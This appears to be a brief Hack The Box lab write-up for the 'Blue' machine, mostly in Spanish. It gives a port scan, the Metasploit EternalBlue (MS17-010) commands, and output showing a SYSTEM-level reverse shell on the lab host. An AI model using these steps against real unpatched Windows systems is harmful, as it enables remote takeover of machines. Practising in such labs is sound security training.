# Blue ![](https://www.hackthebox.eu/storage/avatars/52e077ae40899ab8b024afd51cb29b1c_thumb.png)

## Initial Scan
```
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
```
## Exploit 
Hagamos una excepcion est vez y usemos metasploit
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 10.10.10.40
run
```
Y finalmente leeremos 
```
[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Command shell session 1 opened (10.10.14.23:4444 -> 10.10.10.40:49158) at 2020-11-05 21:44:35 +0100
C:\Windows\system32>whoami
nt authority\system
```
